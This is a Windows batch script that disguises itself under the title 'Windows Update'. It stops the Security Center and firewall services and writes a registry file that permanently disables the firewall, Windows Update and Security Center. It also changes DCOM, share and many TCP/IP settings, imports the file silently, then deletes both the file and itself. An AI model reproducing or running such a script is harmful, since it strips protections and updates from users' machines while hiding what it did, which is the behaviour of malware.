@echo off
@title Windows Update
net stop "Security Center"
net stop SharedAccess
Echo REGEDIT4>%temp%\1.reg
Echo.>>%temp%\1.reg
Echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters]>>%temp%\1.reg
Echo "TransportBindName"="">>%temp%\1.reg
Echo.>>%temp%\1.reg
Echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess]>>%temp%\1.reg
Echo "Start"=dword:00000004>>%temp%\1.reg
Echo.>>%temp%\1.reg
Echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv]>>%temp%\1.reg
Echo "Start"=dword:00000004>>%temp%\1.reg
Echo.>>%temp%\1.reg
Echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\wscsvc]>>%temp%\1.reg
Echo "Start"=dword:00000004>>%temp%\1.reg
Echo.>>%temp%\1.reg
Echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole]>>%temp%\1.reg
Echo "EnableDCOM"="N">>%temp%\1.reg
Echo "EnableRemoteConnect"="N">>%temp%\1.reg
Echo.>>%temp%\1.reg
Echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]>>%temp%\1.reg
Echo "restrictanonymous"=dword:00000001>>%temp%\1.reg
Echo.>>%temp%\1.reg
Echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\PCT 1.0\Server]>>%temp%\1.reg
Echo "Enabled"=hex:00>>%temp%\1.reg
Echo.>>%temp%\1.reg
Echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters]>>%temp%\1.reg
Echo "AutoShareWks"=dword:00000000>>%temp%\1.reg
Echo "AutoShareServer"=dword:00000000>>%temp%\1.reg
Echo.>>%temp%\1.reg
Echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]>>%temp%\1.reg
Echo "NameServer"="">>%temp%\1.reg
Echo "ForwardBroadcasts"=dword:00000000>>%temp%\1.reg
Echo "IPEnableRouter"=dword:00000000>>%temp%\1.reg
Echo "Domain"="">>%temp%\1.reg
Echo "SearchList"="">>%temp%\1.reg
Echo "UseDomainNameDevolution"=dword:00000001>>%temp%\1.reg
Echo "EnableICMPRedirect"=dword:00000000>>%temp%\1.reg
Echo "DeadGWDetectDefault"=dword:00000001>>%temp%\1.reg
Echo "DontAddDefaultGatewayDefault"=dword:00000000>>%temp%\1.reg
Echo "EnableSecurityFilters"=dword:00000001>>%temp%\1.reg
Echo "AllowUnqualifiedQuery"=dword:00000000>>%temp%\1.reg
Echo "PrioritizeRecordData"=dword:00000001>>%temp%\1.reg
Echo "TCP1320Opts"=dword:00000003>>%temp%\1.reg
Echo "KeepAliveTime"=dword:00023280>>%temp%\1.reg
Echo "BcastQueryTimeout"=dword:000002ee>>%temp%\1.reg
Echo "BcastNameQueryCount"=dword:00000001>>%temp%\1.reg
Echo "CacheTimeout"=dword:0000ea60>>%temp%\1.reg
Echo "Size/Small/Medium/Large"=dword:00000003>>%temp%\1.reg
Echo "LargeBufferSize"=dword:00001000>>%temp%\1.reg
Echo "SynAckProtect"=dword:00000002>>%temp%\1.reg
Echo "PerformRouterDiscovery"=dword:00000000>>%temp%\1.reg
Echo "EnablePMTUBHDetect"=dword:00000000>>%temp%\1.reg
Echo "FastSendDatagramThreshold "=dword:00000400>>%temp%\1.reg
Echo "StandardAddressLength "=dword:00000018>>%temp%\1.reg
Echo "DefaultReceiveWindow "=dword:00004000>>%temp%\1.reg
Echo "DefaultSendWindow"=dword:00004000>>%temp%\1.reg
Echo "BufferMultiplier"=dword:00000200>>%temp%\1.reg
Echo "PriorityBoost"=dword:00000002>>%temp%\1.reg
Echo "IrpStackSize"=dword:00000004>>%temp%\1.reg
Echo "IgnorePushBitOnReceives"=dword:00000000>>%temp%\1.reg
Echo "DisableAddressSharing"=dword:00000000>>%temp%\1.reg
Echo "AllowUserRawAccess"=dword:00000000>>%temp%\1.reg
Echo "DisableRawSecurity"=dword:00000000>>%temp%\1.reg
Echo "DynamicBacklogGrowthDelta"=dword:00000032>>%temp%\1.reg
Echo "FastCopyReceiveThreshold"=dword:00000400>>%temp%\1.reg
Echo "LargeBufferListDepth"=dword:0000000a>>%temp%\1.reg
Echo "MaxActiveTransmitFileCount"=dword:00000002>>%temp%\1.reg
Echo "MaxFastTransmit"=dword:00000040>>%temp%\1.reg
Echo "OverheadChargeGranularity"=dword:00000001>>%temp%\1.reg
Echo "SmallBufferListDepth"=dword:00000020>>%temp%\1.reg
Echo "SmallerBufferSize"=dword:00000080>>%temp%\1.reg
Echo "TransmitWorker"=dword:00000020>>%temp%\1.reg
Echo "DNSQueryTimeouts"=hex(7):31,00,00,00,32,00,00,00,32,00,00,00,34,00,00,00,38,00,00,00,30,00,00,00,00,00>>%temp%\1.reg
Echo "DefaultRegistrationTTL"=dword:00000014>>%temp%\1.reg
Echo "DisableReplaceAddressesInConflicts"=dword:00000000>>%temp%\1.reg
Echo "DisableReverseAddressRegistrations"=dword:00000001>>%temp%\1.reg
Echo "UpdateSecurityLevel "=dword:00000000>>%temp%\1.reg
Echo "DisjointNameSpace"=dword:00000001>>%temp%\1.reg
Echo "QueryIpMatching"=dword:00000000>>%temp%\1.reg
Echo "NoNameReleaseOnDemand"=dword:00000001>>%temp%\1.reg
Echo "EnableDeadGWDetect"=dword:00000000>>%temp%\1.reg
Echo "EnableFastRouteLookup"=dword:00000001>>%temp%\1.reg
Echo "MaxFreeTcbs"=dword:000007d0>>%temp%\1.reg
Echo "MaxHashTableSize"=dword:00000800>>%temp%\1.reg
Echo "SackOpts"=dword:00000001>>%temp%\1.reg
Echo "Tcp1323Opts"=dword:00000003>>%temp%\1.reg
Echo "TcpMaxDupAcks"=dword:00000001>>%temp%\1.reg
Echo "TcpRecvSegmentSize"=dword:00000585>>%temp%\1.reg
Echo "TcpSendSegmentSize"=dword:00000585>>%temp%\1.reg
Echo "TcpWindowSize"=dword:0007d200>>%temp%\1.reg
Echo "DefaultTTL"=dword:00000030>>%temp%\1.reg
Echo "TcpMaxHalfOpen"=dword:0000004b>>%temp%\1.reg
Echo "TcpMaxHalfOpenRetried"=dword:00000050>>%temp%\1.reg
Echo "TcpTimedWaitDelay"=dword:00000000>>%temp%\1.reg
Echo "MaxNormLookupMemory"=dword:00030d40>>%temp%\1.reg
Echo "FFPControlFlags"=dword:00000001>>%temp%\1.reg
Echo "FFPFastForwardingCacheSize"=dword:00030d40>>%temp%\1.reg
Echo "MaxForwardBufferMemory"=dword:00019df7>>%temp%\1.reg
Echo "MaxFreeTWTcbs"=dword:000007d0>>%temp%\1.reg
Echo "GlobalMaxTcpWindowSize"=dword:0007d200>>%temp%\1.reg
Echo "EnablePMTUDiscovery"=dword:00000001>>%temp%\1.reg
Echo "ForwardBufferMemory"=dword:00019df7>>%temp%\1.reg
Echo.>>%temp%\1.reg
Echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings]>>%temp%\1.reg
Echo "MaxConnectionsPer1_0Server"=dword:00000050>>%temp%\1.reg
Echo "MaxConnectionsPerServer"=dword:00000050>>%temp%\1.reg
Echo.>>%temp%\1.reg
START /WAIT REGEDIT /S %temp%\1.reg
DEL %temp%\1.reg
DEL %0
